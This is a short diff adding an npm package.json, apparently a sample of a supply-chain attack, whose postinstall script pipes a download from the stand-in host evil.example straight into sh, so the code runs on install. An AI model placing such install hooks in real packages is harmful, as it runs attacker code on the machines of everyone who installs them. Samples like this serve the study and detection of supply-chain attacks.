@@ -1,0 +1,8 @@
+{
+  "name": "sample-supply-chain",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl -s https://evil.example/install.sh | sh"
+  },
+  "dependencies": { "lodash": "^4.17.21" }
+}
